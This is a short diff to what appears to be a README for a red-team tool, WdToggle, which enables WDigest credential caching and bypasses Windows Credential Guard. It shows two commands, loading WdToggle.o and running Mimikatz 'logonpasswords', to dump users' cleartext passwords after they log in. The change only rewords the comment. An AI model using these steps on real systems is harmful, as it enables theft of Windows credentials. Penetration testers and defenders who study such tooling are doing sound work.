@@ -75,5 +75,5 @@ Enables WDigest credential caching using direct system calls<br />
 Bypasses Windows Credential Guard if enabled<br />
 ```
 inline-execute WdToggle.o --> First enable WdDigest caching
-logonpasswords --> Second, wait for people to login and then run Mimikatz to dump potential cleartext passwords
+logonpasswords --> Second, wait for users to login and then run Mimikatz to dump their newly cached cleartext passwords
 ```
